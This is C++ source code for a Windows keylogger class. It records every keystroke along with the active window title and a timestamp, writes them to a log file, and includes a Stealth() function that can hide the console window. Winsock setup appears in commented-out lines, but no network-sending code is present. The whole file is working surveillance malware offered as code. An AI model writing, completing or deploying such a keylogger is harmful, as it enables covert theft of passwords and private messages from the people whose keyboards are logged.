#include "Logger.h"


Logger::Logger(const char * fn){
	fileName = fn;
		//int res;
//	WSADATA wsd;
	OUTPUT_FILE.open(fn,std::ios_base::app);
canLog = false;	
//	res = WSAStartup(MAKEWORD(2,2), &wsd);

std::cout<< "Started Keylogger"<< std::endl;
	
}


int Logger::Save()
{
	logging = true;
	static char lastwindow[256] = "";
	std::string payload="";
    int key_stroke = kbdStruct.vkCode;
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks
	 
	HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;
    if (foreground) {
        //get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
		char window_title[256];
        GetWindowTextA(foreground,(LPSTR)window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
            OUTPUT_FILE << "\n\n[Window: "<< window_title << " - at " << s << "] \n";
            
            payload= payload+ "[ ";
            payload+=window_title;
            payload+=" ]\n";
            
        }
    }

	std::string line="";

	if (key_stroke == VK_BACK){
	line+= "[BACKSPACE]";
	}
       
	else if (key_stroke == VK_RETURN){
			line= "[ENTER]"; 
	}
	//	OUTPUT_FILE <<  "\n";
	else if (key_stroke == VK_SPACE)
	
		line= " ";
	else if (key_stroke == VK_TAB)
		line= "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
	line= "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		line="[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		line= "[ESCAPE]";
	else if (key_stroke == VK_END)
		line= "[END]";
	else if (key_stroke == VK_HOME)
		line= "[HOME]";
	else if (key_stroke == VK_LEFT)
		line ="[LEFT]";
	else if (key_stroke == VK_UP)
		line= "[UP]";
	else if (key_stroke == VK_RIGHT)
		line= "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		line= "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		line= ".";
	else if (key_stroke == 189 || key_stroke == 109)
		line= "-";
	else if (key_stroke == 20)
		line="[CAPSLOCK]";
	else {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 //std::cout<<"lion";
        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;   
        }

        //map virtual key according to keyboard layout 
        key = MapVirtualKeyExA(key_stroke,MAPVK_VK_TO_CHAR, layout);
       /////// std::cout<<key;
        //tolower converts it to lowercase properly
        if (!lowercase) key = tolower(key);
		line=  char(key);

			
    }

    std::cout <<line << '\n';
	OUTPUT_FILE <<line;

	//instead of opening and closing file handlers every time, keep file open and flush.
    OUTPUT_FILE.flush();
    
	return 0;
}

void Logger::Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}


Logger::~Logger(){
	std::cout<<"end";
}
